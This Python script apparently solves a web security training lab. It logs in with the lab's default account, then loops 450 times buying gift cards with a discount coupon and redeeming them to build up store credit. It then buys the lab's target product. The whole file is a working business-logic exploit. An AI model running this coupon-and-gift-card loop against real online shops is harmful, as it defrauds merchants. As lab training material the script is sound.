#!/usr/bin/env python3
import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, "html.parser")
    return soup.find("input", {"name": "csrf"})["value"]

def login(s, url, username, password):
    login_page = url + "/login"
    csrf = get_csrf_token(s, login_page)
    data = {"csrf": csrf, "username": username, "password": password}
    r = s.post(login_page, data=data, verify=False, allow_redirects=True, proxies=proxies, timeout=10)
    if "Log out" in r.text:
        return True
    return False

def run_cycle(s, url, i):
    cart_url = url + "/cart"

    data = {"productId": "2", "redir": "PRODUCT", "quantity": "1"}
    s.post(cart_url, data=data, verify=False, proxies=proxies, timeout=10)

    csrf = get_csrf_token(s, cart_url)
    s.post(url + "/cart/coupon", data={"csrf": csrf, "coupon": "SIGNUP30"}, verify=False, proxies=proxies, timeout=10)

    r = s.post(url + "/cart/checkout", data={"csrf": csrf}, verify=False, proxies=proxies, timeout=10)
    matches = re.findall(r'<tr>\n(.*?)<td>(.*?)<\/td>', r.text)
    if not matches:
        return False

    gift_card = matches[0][1]
    csrf = get_csrf_token(s, url + "/my-account")
    s.post(url + "/gift-card", data={"csrf": csrf, "gift-card": gift_card}, verify=False, proxies=proxies, timeout=10)

    print(f"[*] Running cycles: {i+1}/450", end="\r")
    return True

def buy_jacket(s, url):
    print("\n[*] Buying jacket...")
    cart_url = url + "/cart"
    data = {"productId": "1", "redir": "PRODUCT", "quantity": "1"}
    s.post(cart_url, data=data, verify=False, proxies=proxies, timeout=10)
    csrf = get_csrf_token(s, cart_url)
    r = s.post(url + "/cart/checkout", data={"csrf": csrf}, verify=False, proxies=proxies, timeout=10)
    if "Congratulations" in r.text:
        print("[+] Jacket purchased - Lab solved!")
        return True
    print("[-] Failed to buy jacket")
    return False

def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <URL>")
        sys.exit(0)

    s = requests.Session()
    url = sys.argv[1].strip().rstrip("/")

    if not login(s, url, "wiener", "peter"):
        print("[-] Login failed")
        return
    print("[+] Logged in as wiener")

    for i in range(450):
        run_cycle(s, url, i)

    buy_jacket(s, url)

if __name__ == "__main__":
    main()